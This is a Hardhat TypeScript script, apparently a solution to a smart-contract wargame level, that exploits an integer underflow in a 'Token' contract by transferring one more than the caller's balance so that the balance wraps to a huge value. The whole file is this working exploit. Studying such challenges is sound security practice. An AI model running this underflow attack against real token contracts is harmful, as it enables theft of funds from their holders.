import {ethers} from "hardhat"
import {Token} from '../typechain-types'
import dotenv from 'dotenv'

dotenv.config()

async function main() {
    const isTest = false
    let instanceAddress: string
    let target: Token
    if (isTest) {
        target = await ethers.deployContract('Token', [20]);
    } else {
        instanceAddress = process.env.TARGET_ADDRESS_5!
        target = await ethers.getContractAt('Token', instanceAddress)
    }

    const [deployer] = await ethers.getSigners()
    const currentBalance = await target.balanceOf(deployer.address)
    console.log(`current balance: ${currentBalance}`)

    await target.transfer(ethers.ZeroAddress, currentBalance + 1n)
    console.log(`current balance: ${await target.balanceOf(deployer.address)}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
